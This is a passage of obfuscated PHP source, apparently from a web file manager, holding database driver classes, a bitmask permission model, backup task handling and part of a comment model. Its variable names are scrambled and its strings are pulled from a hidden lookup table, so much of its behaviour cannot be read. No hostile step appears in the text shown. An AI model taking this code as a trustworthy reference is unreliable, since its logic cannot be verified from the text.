$this->error .= LNG($–å—Ğ«²[48]) . $this->queryStr; } think_trace($this->error, $–å—Ğ«²[12], $–å—Ğ«²[49]); return $this->error; } public function escapeString($ê…à¸Èı) { if ($this->_linkID) { return mysql_real_escape_string($ê…à¸Èı, $this->_linkID); } else { return mysql_escape_string($ê…à¸Èı); } } public function parseKey(&$¤ÓÍïÆ, $¹Š”©‰ü = true) { $ìêèÓ‘ =& $_SERVER[ĞÂ¤àÓï]; if ($¹Š”©‰ü) { $¤ÓÍïÆ = $this->parseKeyCheck($¤ÓÍïÆ); } if ($¤ÓÍïÆ != $ìêèÓ‘[188] && !preg_match($ìêèÓ‘[911], $¤ÓÍïÆ)) { $¤ÓÍïÆ = $ìêèÓ‘[385] . trim($¤ÓÍïÆ, $ìêèÓ‘[385]) . $ìêèÓ‘[385]; } return $¤ÓÍïÆ; } } class DbMysqli extends Db { public function __construct($§»ÓöØ› = '') { $ó¹”¢Ç  =& $_SERVER[ĞÂ¤àÓï]; if (!extension_loaded($ó¹”¢Ç [912])) { think_exception(think_lang($ó¹”¢Ç [14]) . $ó¹”¢Ç [913]); } if (!empty($§»ÓöØ›)) { $this->config = $§»ÓöØ›; if (empty($this->config[$ó¹”¢Ç [17]])) { $this->config[$ó¹”¢Ç [17]] = $ó¹”¢Ç [12]; } } } public function connect($â¤Ş±÷® = '', $õ›Ğùç¥ = 0) { $š…Ÿâç =& $_SERVER[ĞÂ¤àÓï]; if (!isset($this->linkID[$õ›Ğùç¥])) { if (empty($â¤Ş±÷®)) { $â¤Ş±÷® = $this->config; } $this->linkID[$õ›Ğùç¥] = new mysqli($â¤Ş±÷®[$š…Ÿâç[886]], $â¤Ş±÷®[$š…Ÿâç[888]], $â¤Ş±÷®[$š…Ÿâç[889]], $â¤Ş±÷®[$š…Ÿâç[21]], $â¤Ş±÷®[$š…Ÿâç[887]] ? intval($â¤Ş±÷®[$š…Ÿâç[887]]) : 3306); if (mysqli_connect_errno()) { think_exception(mysqli_connect_error()); } $‡ÚÅ½ˆà = $this->linkID[$õ›Ğùç¥]->server_version; $this->linkID[$õ›Ğùç¥]->query($š…Ÿâç[890] . think_config($š…Ÿâç[891]) . $š…Ÿâç[58]); if ($‡ÚÅ½ˆà > $š…Ÿâç[892]) { $this->linkID[$õ›Ğùç¥]->query($š…Ÿâç[893]); } $this->connected = !0; if (1 != think_config($š…Ÿâç[22])) { unset($this->config); } } return $this->linkID[$õ›Ğùç¥]; } public function free() { $this->queryID->free_result(); $this->queryID = null; } public function query($…ŞÅÙå‰) { $’·úòÌ¹ =& $_SERVER[ĞÂ¤àÓï]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $…ŞÅÙå‰; if ($this->queryID) { $this->free(); } think_action_status($’·úòÌ¹[23], 1); think_status($’·úòÌ¹[24]); $this->queryID = $this->_linkID->query($…ŞÅÙå‰); if ($this->_linkID->more_results()) { while (($¢İ×Üƒ‰ = $this->_linkID->next_result()) != NULL) { $¢İ×Üƒ‰->free_result(); } } $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = $this->queryID->num_rows; $this->numCols = $this->queryID->field_count; return $this->getAll(); } } public function execute($½óÎƒü) { $ÑåÊÀ½’ =& $_SERVER[ĞÂ¤àÓï]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $½óÎƒü; if ($this->queryID) { $this->free(); } think_action_status($ÑåÊÀ½’[25], 1); think_status($ÑåÊÀ½’[24]); $œøï‰Ä· = $this->_linkID->query($½óÎƒü); $this->debug(); if (!1 === $œøï‰Ä·) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->affected_rows; $this->lastInsID = $this->_linkID->insert_id; return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if ($this->transTimes == 0) { $this->_linkID->autocommit(!1); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $ôÏµ‘Åè = $this->_linkID->commit(); $this->_linkID->autocommit(!0); $this->transTimes = 0; if (!$ôÏµ‘Åè) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $øØÃö»Ü = $this->_linkID->rollback(); $this->transTimes = 0; if (!$øØÃö»Ü) { $this->error(); return !1; } } return !0; } private function getAll() { $š ¹¬³ù = array(); if ($this->numRows > 0) { for ($ƒû³¢«® = 0; $ƒû³¢«® < $this->numRows; $ƒû³¢«®++) { $š ¹¬³ù[$ƒû³¢«®] = $this->queryID->fetch_assoc(); } $this->queryID->data_seek(0); } return $š ¹¬³ù; } public function getFields($‚¸Á¹…) { $üŸ˜æ°È =& $_SERVER[ĞÂ¤àÓï]; $¹˜ÉÜáŠ = $this->query($üŸ˜æ°È[897] . $this->parseKey($‚¸Á¹…)); $Ïˆ§œ³Ù = array(); if ($¹˜ÉÜáŠ) { foreach ($¹˜ÉÜáŠ as $¸¹¯‚Â => $ÁÖ‰İœ´) { $Ïˆ§œ³Ù[$ÁÖ‰İœ´[$üŸ˜æ°È[31]]] = array($üŸ˜æ°È[32] => $ÁÖ‰İœ´[$üŸ˜æ°È[31]], $üŸ˜æ°È[33] => $ÁÖ‰İœ´[$üŸ˜æ°È[34]], $üŸ˜æ°È[35] => (bool) ($ÁÖ‰İœ´[$üŸ˜æ°È[36]] === $üŸ˜æ°È[12]), $üŸ˜æ°È[37] => $ÁÖ‰İœ´[$üŸ˜æ°È[38]], $üŸ˜æ°È[39] => strtolower($ÁÖ‰İœ´[$üŸ˜æ°È[40]]) == $üŸ˜æ°È[41], $üŸ˜æ°È[42] => strtolower($ÁÖ‰İœ´[$üŸ˜æ°È[43]]) == $üŸ˜æ°È[44]); } } return $Ïˆ§œ³Ù; } public function getTables($ã‘¼ú»‹ = '') { $ÌÙ‹¹Òğ =& $_SERVER[ĞÂ¤àÓï]; $Ù¶¬›¤´ = !empty($ã‘¼ú»‹) ? $ÌÙ‹¹Òğ[899] . $ã‘¼ú»‹ . $ÌÙ‹¹Òğ[900] : $ÌÙ‹¹Òğ[901]; $Üı˜ô–Ğ = $this->query($Ù¶¬›¤´); $šÂ‹ÍØà = array(); if ($Üı˜ô–Ğ) { foreach ($Üı˜ô–Ğ as $ã°»ˆ×ı => $å’†Ÿ¦Ö) { $šÂ‹ÍØà[$ã°»ˆ×ı] = current($å’†Ÿ¦Ö); } } return $šÂ‹ÍØà; } public function replace($÷üãû…, $œ±½ï²‹ = array()) { $šúÚÂÃ» =& $_SERVER[ĞÂ¤àÓï]; foreach ($÷üãû… as $ÅË¡ò†º => $¸Æ¹¥¢) { $³”©Å•® = $this->parseValue($¸Æ¹¥¢); if (is_scalar($³”©Å•®)) { $’‚·é«Í[] = $³”©Å•®; $ûÌıñ¿‚[] = $this->parseKey($ÅË¡ò†º); } } $Ñàçöìğ = $šúÚÂÃ»[902] . $this->parseTable($œ±½ï²‹[$šúÚÂÃ»[279]]) . $šúÚÂÃ»[903] . implode($šúÚÂÃ»[50], $ûÌıñ¿‚) . $šúÚÂÃ»[904] . implode($šúÚÂÃ»[50], $’‚·é«Í) . $šúÚÂÃ»[905]; return $this->execute($Ñàçöìğ); } public function insertAll($¥Ã²Ï, $ªŒîçÄÎ = array(), $¾ßåíÇ“ = false) { $ƒïšçøÂ =& $_SERVER[ĞÂ¤àÓï]; if (!is_array($¥Ã²Ï[0])) { return !1; } $ïÃù¹Ü = array_keys($¥Ã²Ï[0]); $æ£¬İ¿ = array(); foreach ($¥Ã²Ï as $ŠÈÄ×ê ) { $Ï÷Ò¡Ù¿ = array(); foreach ($ŠÈÄ×ê  as $“¯áòóƒ => $±îğäÇ) { $±îğäÇ = $this->parseValue($±îğäÇ); if (is_scalar($±îğäÇ)) { $Ï÷Ò¡Ù¿[] = $±îğäÇ; } } $æ£¬İ¿[] = $ƒïšçøÂ[260] . implode($ƒïšçøÂ[50], $Ï÷Ò¡Ù¿) . $ƒïšçøÂ[905]; } array_walk($ïÃù¹Ü, array($this, $ƒïšçøÂ[906])); $ˆØ¤ÜË‘ = $¾ßåíÇ“ ? $ƒïšçøÂ[907] : $ƒïšçøÂ[908]; $©ÙÑ¢”… = $ˆØ¤ÜË‘ . $ƒïšçøÂ[909] . $this->parseTable($ªŒîçÄÎ[$ƒïšçøÂ[279]]) . $ƒïšçøÂ[903] . implode($ƒïšçøÂ[50], $ïÃù¹Ü) . $ƒïšçøÂ[910] . implode($ƒïšçøÂ[50], $æ£¬İ¿); return $this->execute($©ÙÑ¢”…); } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $‡ıí‰Å£ =& $_SERVER[ĞÂ¤àÓï]; $this->error = $this->_linkID->errno . $‡ıí‰Å£[4] . $this->_linkID->error; if ($‡ıí‰Å£[12] != $this->queryStr) { $this->error .= LNG($‡ıí‰Å£[48]) . $this->queryStr; } think_trace($this->error, $‡ıí‰Å£[12], $‡ıí‰Å£[49]); return $this->error; } public function escapeString($÷û—ş ¡) { if ($this->_linkID) { return $this->_linkID->real_escape_string($÷û—ş ¡); } else { return addslashes($÷û—ş ¡); } } public function parseKey(&$¹¼á“Î·, $Ê‹¿½ó£ = true) { $¨——ˆ„ =& $_SERVER[ĞÂ¤àÓï]; if ($Ê‹¿½ó£) { $¹¼á“Î· = $this->parseKeyCheck($¹¼á“Î·); } if ($¹¼á“Î· != $¨——ˆ„[188] && !preg_match($¨——ˆ„[911], $¹¼á“Î·)) { $¹¼á“Î· = $¨——ˆ„[385] . trim($¹¼á“Î·, $¨——ˆ„[385]) . $¨——ˆ„[385]; } return $¹¼á“Î·; } } goto C‘”©ÌÇ©‘; A¨†ˆíÕÓÖ: class AuthModel extends ModelBaseLight { const AUTH_SHOW = 1; const AUTH_VIEW = 2; const AUTH_DOWNLOAD = 4; const AUTH_UPLOAD = 8; const AUTH_EDIT = 16; const AUTH_REMOVE = 32; const AUTH_SHARE = 64; const AUTH_COMMENT = 128; const AUTH_EVENT = 256; const AUTH_ROOT = 33554432; public static function authAll() { return self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT; } public static function authDefault() { $Ù½ƒà°€ =& $_SERVER[ĞÂ¤àÓï]; $ÉèÌ‹Ï = array(array($Ù½ƒà°€[420] => LNG($Ù½ƒà°€[1855]), $Ù½ƒà°€[1856] => $Ù½ƒà°€[1857], $Ù½ƒà°€[1858] => 1, $Ù½ƒà°€[1859] => 1, $Ù½ƒà°€[1860] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT), array($Ù½ƒà°€[420] => LNG($Ù½ƒà°€[1861]), $Ù½ƒà°€[1856] => $Ù½ƒà°€[1862], $Ù½ƒà°€[1858] => 2, $Ù½ƒà°€[1859] => 1, $Ù½ƒà°€[1860] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_COMMENT | self::AUTH_EVENT), array($Ù½ƒà°€[420] => LNG($Ù½ƒà°€[1863]), $Ù½ƒà°€[1856] => $Ù½ƒà°€[1864], $Ù½ƒà°€[1858] => 3, $Ù½ƒà°€[1859] => 1, $Ù½ƒà°€[1860] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_COMMENT | self::AUTH_EVENT), array($Ù½ƒà°€[420] => LNG($Ù½ƒà°€[1865]), $Ù½ƒà°€[1856] => $Ù½ƒà°€[1866], $Ù½ƒà°€[1858] => 4, $Ù½ƒà°€[1859] => 1, $Ù½ƒà°€[1860] => self::AUTH_SHOW | self::AUTH_VIEW), array($Ù½ƒà°€[420] => LNG($Ù½ƒà°€[1867]), $Ù½ƒà°€[1856] => $Ù½ƒà°€[1868], $Ù½ƒà°€[1858] => 5, $Ù½ƒà°€[1859] => 1, $Ù½ƒà°€[1860] => self::AUTH_SHOW | self::AUTH_UPLOAD), array($Ù½ƒà°€[420] => LNG($Ù½ƒà°€[1869]), $Ù½ƒà°€[1856] => $Ù½ƒà°€[1870], $Ù½ƒà°€[1858] => 6, $Ù½ƒà°€[1859] => 1, $Ù½ƒà°€[1860] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT), array($Ù½ƒà°€[420] => LNG($Ù½ƒà°€[1871]), $Ù½ƒà°€[1856] => $Ù½ƒà°€[1872], $Ù½ƒà°€[1858] => 7, $Ù½ƒà°€[1859] => 1, $Ù½ƒà°€[1860] => 0)); return $ÉèÌ‹Ï; } public static function authCheck($ÉúÊËôş, $Üî™øÙ²) { $È†«î’Ò =& $_SERVER[ĞÂ¤àÓï]; $ÉúÊËôş = intval($ÉúÊËôş); if ($GLOBALS[$È†«î’Ò[503]] && $GLOBALS[$È†«î’Ò[6]][$È†«î’Ò[1873]]) { return !0; } if ($ÉúÊËôş <= 0) { return !1; } if (($ÉúÊËôş & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($ÉúÊËôş & $Üî™øÙ²); } public static function authCheckShow($ğàêóÑå) { return self::authCheck($ğàêóÑå, self::AUTH_SHOW); } public static function authCheckView($œˆ¼¾À) { return self::authCheck($œˆ¼¾À, self::AUTH_VIEW); } public static function authCheckDownload($¼ƒåƒ†) { return self::authCheck($¼ƒåƒ†, self::AUTH_DOWNLOAD); } public static function authCheckUpload($ü¤“öñõ) { return self::authCheck($ü¤“öñõ, self::AUTH_UPLOAD); } public static function authCheckEdit($àİ©ÈµĞ) { return self::authCheck($àİ©ÈµĞ, self::AUTH_EDIT); } public static function authCheckRemove($áîÅÜ) { return self::authCheck($áîÅÜ, self::AUTH_REMOVE); } public static function authCheckShare($¾ŞøÒ•–) { return self::authCheck($¾ŞøÒ•–, self::AUTH_SHARE); } public static function authCheckComment($ëìù×Ø ) { return self::authCheck($ëìù×Ø , self::AUTH_COMMENT); } public static function authCheckEvent($·ÜÁğ¡Ò) { return self::authCheck($·ÜÁğ¡Ò, self::AUTH_EVENT); } public static function authCheckRoot($§ÈÈ„Ù) { return self::authCheck($§ÈÈ„Ù, self::AUTH_ROOT); } public static function authCheckAction($ÃñÖ›š’, $Â¡ñ§‘) { $ÅÆôºš =& $_SERVER[ĞÂ¤àÓï]; $Û¼ì÷¬ù = array($ÅÆôºš[1874] => self::AUTH_VIEW, $ÅÆôºš[1195] => self::AUTH_DOWNLOAD, $ÅÆôºš[107] => self::AUTH_UPLOAD, $ÅÆôºš[1824] => self::AUTH_EDIT, $ÅÆôºš[1823] => self::AUTH_REMOVE, $ÅÆôºš[1834] => self::AUTH_SHARE, $ÅÆôºš[354] => self::AUTH_COMMENT, $ÅÆôºš[1652] => self::AUTH_EVENT, $ÅÆôºš[1875] => self::AUTH_ROOT); if (!isset($Û¼ì÷¬ù[$Â¡ñ§‘])) { return; } $ÁñàÛ×– = $Û¼ì÷¬ù[$Â¡ñ§‘]; $ÃñÖ›š’ = intval($ÃñÖ›š’); if ($ÃñÖ›š’ <= 0) { return !1; } if (($ÃñÖ›š’ & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($ÃñÖ›š’ & $ÁñàÛ×–); } public static function authDisable($»ÉÃ¶ø, $Ô™ÍÍ¢Œ) { if (intval($»ÉÃ¶ø) <= 0) { return 0; } return intval($»ÉÃ¶ø) & ~$Ô™ÍÍ¢Œ; } public $optionType = "\x53\171\163\x74\x65\155\x2e\x73\x6f\165\x72\143\x65\101\165\164\150\x4c\x69\163\164"; public $field = array("\x6e\141\155\x65", "\141\165\x74\x68", "\x6c\141\142\145\154", "\144\x69\163\160\x6c\141\x79", "\x73\x79\163\x74\145\x6d", "\x73\x6f\x72\x74"); public function initData() { $ùøºÕ‚ˆ = $this->authDefault(); foreach ($ùøºÕ‚ˆ as $œÚÔï¦®) { $this->add($œÚÔï¦®); } } public function findAuth($ºç¡ÓÈÅ, $™ôºåîí) { $¾ä¿¨µ² =& $_SERVER[ĞÂ¤àÓï]; $Çü–Ø­” = parent::listData(); foreach ($Çü–Ø­” as $¬Ş­“…«) { $×öıüÄº = intval($¬Ş­“…«[$¾ä¿¨µ²[413]]); if ($×öıüÄº <= 0 || $¬Ş­“…«[$¾ä¿¨µ²[1876]] == 0) { continue; } if (($×öıüÄº & $ºç¡ÓÈÅ) != $ºç¡ÓÈÅ) { continue; } if (($×öıüÄº & $™ôºåîí) != 0) { continue; } return $¬Ş­“…«[$¾ä¿¨µ²[399]]; } return !1; } public function findAuthReadOnly() { $‚ğŸ·¼Î = self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD; $ÃÙ–ıÌ¢ = self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE; return $this->findAuth($‚ğŸ·¼Î, $ÃÙ–ıÌ¢); } public function findAuthNotRead() { return $this->findAuth(0, self::AUTH_SHOW); } public function findAuthMinDefault() { $Ë„‰óŠà =& $_SERVER[ĞÂ¤àÓï]; $®¼Œ¾¶ç = parent::listData(); $“š‚¦†  = !1; foreach ($®¼Œ¾¶ç as $†è…«¡) { if ($†è…«¡[$Ë„‰óŠà[413]] <= 0 || $†è…«¡[$Ë„‰óŠà[1876]] == $Ë„‰óŠà[197]) { continue; } if (!$“š‚¦† ) { $“š‚¦†  = $†è…«¡; continue; } if ($“š‚¦† [$Ë„‰óŠà[413]] > $†è…«¡[$Ë„‰óŠà[413]]) { $“š‚¦†  = $†è…«¡; } } return $“š‚¦†  ? $“š‚¦† [$Ë„‰óŠà[399]] : $Ë„‰óŠà[12]; } public function listData($ÙÌüšğş = false, $œïß¢Ôê = "\x73\157\x72\164", $·ÅşÃ±Ö = false) { return parent::listData($ÙÌüšğş, $œïß¢Ôê, $·ÅşÃ±Ö); } public function update($Ğà­Š†, $Âê¢ò±Ş) { $¥ÂĞâÑÕ =& $_SERVER[ĞÂ¤àÓï]; $ûé¤ÏËø = parent::listData($Ğà­Š†); $Æ´óØ¹Ò = $this->findByName($Âê¢ò±Ş[$¥ÂĞâÑÕ[32]]); if (!$ûé¤ÏËø || $Æ´óØ¹Ò && $Æ´óØ¹Ò[$¥ÂĞâÑÕ[399]] != $ûé¤ÏËø[$¥ÂĞâÑÕ[399]]) { return !1; } $this->filterAuth($Âê¢ò±Ş[$¥ÂĞâÑÕ[413]]); return parent::update($Ğà­Š†, $Âê¢ò±Ş); } public function remove($Œæáå¯µ) { $¥ó¯ÔÖî = parent::listData($Œæáå¯µ); if (!$¥ó¯ÔÖî || $¥ó¯ÔÖî[$_SERVER[ĞÂ¤àÓï][1285]]) { return !1; } return parent::remove($Œæáå¯µ); } public function add($¹ñš¶—Ã = array()) { $€ì«Øé =& $_SERVER[ĞÂ¤àÓï]; if ($this->findByName($¹ñš¶—Ã[$€ì«Øé[32]])) { return !1; } $Á®™Àı§ = array($€ì«Øé[32] => $€ì«Øé[12], $€ì«Øé[413] => 1, $€ì«Øé[1877] => $€ì«Øé[1864], $€ì«Øé[1876] => 1, $€ì«Øé[1285] => 0, $€ì«Øé[1878] => 0); $¹ñš¶—Ã = array_merge($Á®™Àı§, $¹ñš¶—Ã); $¹ñš¶—Ã[$€ì«Øé[1878]] = $this->getSort(); $this->filterAuth($¹ñš¶—Ã[$€ì«Øé[413]]); return parent::insert($¹ñš¶—Ã); } private function getSort() { $ï¬ßÛÏ =& $_SERVER[ĞÂ¤àÓï]; $Ç…é†ıî = parent::listData(); $¯Û¢‡å¥ = array_to_keyvalue($Ç…é†ıî, $ï¬ßÛÏ[12], $ï¬ßÛÏ[1878]); return empty($¯Û¢‡å¥) ? 0 : max($¯Û¢‡å¥) + 1; } private function filterAuth(&$ÖºŠ²şÂ) { if (!$ÖºŠ²şÂ) { return; } $½ Å ó = array(self::AUTH_SHOW, self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT, self::AUTH_REMOVE, self::AUTH_SHARE, self::AUTH_COMMENT, self::AUTH_EVENT, self::AUTH_ROOT); $„³ğÌÏ® = array(); foreach ($½ Å ó as $Ğ³í¬öÊ) { if ($ÖºŠ²şÂ & $Ğ³í¬öÊ) { $„³ğÌÏ®[] = $Ğ³í¬öÊ; } } if (in_array(self::AUTH_ROOT, $„³ğÌÏ®)) { $ÖºŠ²şÂ = array_sum($½ Å ó); return; } $×öòØÏë = array(self::AUTH_DOWNLOAD => array(self::AUTH_VIEW), self::AUTH_EDIT => array(self::AUTH_VIEW), self::AUTH_REMOVE => array(self::AUTH_EDIT), self::AUTH_SHARE => array(self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT)); foreach ($„³ğÌÏ® as $Ğ³í¬öÊ) { if (isset($×öòØÏë[$Ğ³í¬öÊ])) { $„³ğÌÏ® = array_merge($„³ğÌÏ®, $×öòØÏë[$Ğ³í¬öÊ]); } } $„³ğÌÏ®[] = self::AUTH_SHOW; $ÖºŠ²şÂ = array_sum(array_unique($„³ğÌÏ®)); } public function sort($Âº¬„º·, $œ¢ª½¼) { return parent::update($Âº¬„º·, $œ¢ª½¼); } } class BackupModel extends ModelBaseLight { public $optionType = "\x53\x79\163\164\x65\155\x2e\142\141\143\x6b\x75\160\114\x69\163\x74"; public $field = array("\151\x6f", "\156\x61\155\145", "\x73\x74\141\x74\165\x73", "\143\x6f\x6e\x74\x65\x6e\164", "\155\x61\156\x75\141\x6c", "\162\145\163\x75\154\164", "\x74\151\155\145\106\162\x6f\155", "\x74\x69\155\x65\124\157"); public function config() { $Ï­©³ºú =& $_SERVER[ĞÂ¤àÓï]; $Ë®‡Ó× = Model($Ï­©³ºú[769])->get($Ï­©³ºú[787]); $Ë®‡Ó× = json_decode($Ë®‡Ó×, !0); $Ë®‡Ó× = is_array($Ë®‡Ó×) ? $Ë®‡Ó× : array(); if (!isset($Ë®‡Ó×[$Ï­©³ºú[754]])) { $Ë®‡Ó×[$Ï­©³ºú[754]] = $Ï­©³ºú[88]; } unset($Ë®‡Ó×[$Ï­©³ºú[1634]]); Action($Ï­©³ºú[1879])->taskInit(); Model($Ï­©³ºú[1633])->cacheClear(); $æ¿öäÚø = $Ï­©³ºú[1880]; $¥Ş”àòå = Model($Ï­©³ºú[1881])->findByKey($Ï­©³ºú[1652], $æ¿öäÚø); if (!$¥Ş”àòå) { $¥Ş”àòå = array(); } if (isset($¥Ş”àòå[$Ï­©³ºú[203]])) { $¥Ş”àòå[$Ï­©³ºú[203]] = json_decode($¥Ş”àòå[$Ï­©³ºú[203]], !0); } if (isset($Ë®‡Ó×[$Ï­©³ºú[203]])) { $¥Ş”àòå[$Ï­©³ºú[203]][$Ï­©³ºú[1637]] = $Ë®‡Ó×[$Ï­©³ºú[203]]; unset($Ë®‡Ó×[$Ï­©³ºú[203]]); } return array_merge($¥Ş”àòå, $Ë®‡Ó×); } public function listData($§Á§Éë– = false, $Ô•¡òâÔ = "\x6d\x6f\144\151\x66\x79\124\x69\x6d\145", $·‡ºé£¼ = false) { return parent::listData($§Á§Éë–, $Ô•¡òâÔ, !0); } public function lastItem() { $Š¯›íêš = $this->listData(); return !empty($Š¯›íêš[0]) ? $Š¯›íêš[0] : null; } public function kill($«õû¡§Á) { $ëÏÌ’¤ =& $_SERVER[ĞÂ¤àÓï]; $×¬¦ï = $this->listData($«õû¡§Á); if (!$×¬¦ï || empty($×¬¦ï[$ëÏÌ’¤[32]])) { return !0; } Task::kill($ëÏÌ’¤[786]); Task::kill($ëÏÌ’¤[807]); Task::kill($ëÏÌ’¤[816]); $Éê¬‘Ñ¢ = $×¬¦ï[$ëÏÌ’¤[32]]; $ÕÊ×Óá× = TEMP_FILES . $ëÏÌ’¤[785] . $Éê¬‘Ñ¢ . $ëÏÌ’¤[8]; IO::remove($ÕÊ×Óá×, !1); return $this->remove($«õû¡§Á); } public function remove($‹ÑÒæ«) { $ïÀêÀªâ = $this->listData($‹ÑÒæ«); if (!$ïÀêÀªâ) { return !0; } return $this->backupRemove($ïÀêÀªâ); } private function backupRemove($ûØÇî€˜) { parent::remove($ûØÇî€˜[$_SERVER[ĞÂ¤àÓï][399]]); $Ù¢æ¶œö = $this->backupPath($ûØÇî€˜); IO::remove($Ù¢æ¶œö, !1); return !0; } private function backupPath($ÉÚ¡Û¼±) { $öÖ†ñïæ =& $_SERVER[ĞÂ¤àÓï]; $ƒÈúÍÄ÷ = $ÉÚ¡Û¼±[$öÖ†ñïæ[32]]; $÷Š‚Ïİ½ = Model($öÖ†ñïæ[769])->get($öÖ†ñïæ[770]); $æŞºªú€ = substr(md5($öÖ†ñïæ[771] . $÷Š‚Ïİ½ . $ƒÈúÍÄ÷), 0, 8); return "\x7b\x69\x6f\x3a{$ÉÚ¡Û¼±[$öÖ†ñïæ[751]]}\x7d\57\144\x61\x74\x61\x62\x61\163\x65\57\x62\x61\143\153\165\x70\57" . $ƒÈúÍÄ÷ . $öÖ†ñïæ[11] . $æŞºªú€; } public function start() { $ÃİÇ–ßÙ =& $_SERVER[ĞÂ¤àÓï]; if ($GLOBALS[$ÃİÇ–ßÙ[6]][$ÃİÇ–ßÙ[89]][$ÃİÇ–ßÙ[1882]] != $ÃİÇ–ßÙ[88]) { return !0; } $ıµŞÉÎë = $this->config(); if (!$ıµŞÉÎë || $ıµŞÉÎë[$ÃİÇ–ßÙ[1634]] != $ÃİÇ–ßÙ[88]) { return !1; } $ßÂ‚¹ö = $this->process(); foreach ($ßÂ‚¹ö as $¾™Ğ”Œ) { if ($¾™Ğ”Œ) { return Task::restart($¾™Ğ”Œ[$ÃİÇ–ßÙ[399]]); } } $ëÙÅÄè = new Backup(); $ÈùÜãÜŸ = $ëÙÅÄè->db(); if ($ÈùÜãÜŸ) { $ÈùÜãÜŸ = $ëÙÅÄè->dbFile(); if ($ÈùÜãÜŸ && $ıµŞÉÎë[$ÃİÇ–ßÙ[754]] == $ÃİÇ–ßÙ[197]) { $ÈùÜãÜŸ = $ëÙÅÄè->file(); } } Backup::set(array($ÃİÇ–ßÙ[749] => 1, $ÃİÇ–ßÙ[497] => time())); return !0; } public function process() { $¢ëî™•¥ =& $_SERVER[ĞÂ¤àÓï]; $òşÑ‡ƒ— = array($¢ëî™•¥[757] => Task::get($¢ëî™•¥[786]), $¢ëî™•¥[761] => Task::get($¢ëî™•¥[807]), $¢ëî™•¥[199] => Task::get($¢ëî™•¥[816])); $åÔòÚÜ = !1; foreach ($òşÑ‡ƒ— as &$Çñ‰–€) { if ($åÔòÚÜ) { $Çñ‰–€ = !1; continue; } if ($Çñ‰–€) { $ºæÕº¯• = intval(_get($Çñ‰–€, $¢ëî™•¥[1669], 0)); if (time() - $ºæÕº¯• > 7200) { Task::kill($Çñ‰–€[$¢ëî™•¥[399]]); $åÔòÚÜ = !0; $Çñ‰–€ = !1; } } } return $òşÑ‡ƒ—; } public function restore() { $òËåíÎ’ =& $_SERVER[ĞÂ¤àÓï]; ActionCall($òËåíÎ’[1060], !0, 1); ActionCall($òËåíÎ’[1060], !0, 0); } } class CommentModel extends ModelBase { protected $tableName = "\143\x6f\x6d\155\145\x6e\x74"; protected $tableMeta = array("\x74\x61\142\x6c\x65\x4e\x61\155\x65" => "\143\x6f\x6d\155\x65\156\164\x5f\x6d\x65\x74\141", "\x6d\x65\164\141\x46\x69\145\x6c\x64" => "\x63\157\x6d\x6d\x65\156\164\x49\x44"); const TYPE_SOURCE = 1; const TYPE_SHARE = 2; const TYPE_USER = 3; const TYPE_GROUP = 4; const TYPE_TOPIC = 5; const TYPE_STAR_OFFSET = 100000000; public static $TYPEALL = array(self::TYPE_SOURCE, self::TYPE_SHARE, self::TYPE_USER, self::TYPE_GROUP, self::TYPE_TOPIC); public function addComment($²ç¯¹õè) { $Ÿ¼—æôò =& $_SERVER[ĞÂ¤àÓï]; if ($²ç¯¹õè[$Ÿ¼—æôò[1883]]) { $Ø³à…“ó = $this->where(array($Ÿ¼—æôò[1884] => $²ç¯¹õè[$Ÿ¼—æôò[1883]]))->find(); if (!$Ø³à…“ó || $Ø³à…“ó[$Ÿ¼—æôò[411]] != $²ç¯¹õè[$Ÿ¼—æôò[411]] || $Ø³à…“ó[$Ÿ¼—æôò[505]] != $²ç¯¹õè[$Ÿ¼—æôò[505]]) { return !1; } $this->where(array($Ÿ¼—æôò[1884] => $²ç¯¹õè[$Ÿ¼—æôò[1883]]))->setAdd($Ÿ¼—æôò[1885], 1); } $²ç¯¹õè[$Ÿ¼—æôò[1886]] = 0; $²ç¯¹õè[$Ÿ¼—æôò[1885]] = 0; $²ç¯¹õè[$Ÿ¼—æôò[749]] = 1; return $this->add($²ç¯¹õè); } public function commentCount($œ«œßÍ·, $šŞ©ç®®, $­Ø¸Ù£ = false) { $í°´ıİÀ =& $_SERVER[ĞÂ¤àÓï]; if (!$œ«œßÍ·) { return array(); } if (is_string($œ«œßÍ·) || is_int($œ«œßÍ·)) { $œ«œßÍ· = array($œ«œßÍ·); } $—ô‘½çã = array($í°´ıİÀ[505], $í°´ıİÀ[1887] => $í°´ıİÀ[500]); $Ô¤à™¢Ó = array($í°´ıİÀ[505] => array($í°´ıİÀ[7], $œ«œßÍ·), $í°´ıİÀ[411] => $šŞ©ç®®); if ($­Ø¸Ù£) { $Ô¤à™¢Ó[$í°´ıİÀ[1664]] = $­Ø¸Ù£; } $İñæÙ = 